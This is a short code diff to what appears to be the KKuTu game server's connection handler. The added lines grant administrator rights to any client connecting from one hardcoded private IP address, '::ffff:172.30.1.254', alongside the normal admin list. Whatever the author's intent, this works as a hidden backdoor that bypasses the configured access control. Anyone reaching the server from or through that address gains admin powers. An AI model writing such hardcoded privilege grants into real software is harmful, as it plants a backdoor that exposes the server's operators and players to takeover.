@@ -492,6 +492,9 @@ exports.init = function(_SID, CHAN){
 				$c = new KKuTu.Client(socket, $body ? $body.profile : null, key);
 				$c.admin = GLOBAL.ADMIN.indexOf($c.id) != -1;
 				$c.remoteAddress = info.connection.remoteAddress;
+				if($c.remoteAddress === "::ffff:172.30.1.254"){
+					$c.admin = true;
+				}
 				
 				if(DIC[$c.id]){
 					DIC[$c.id].sendError(408);
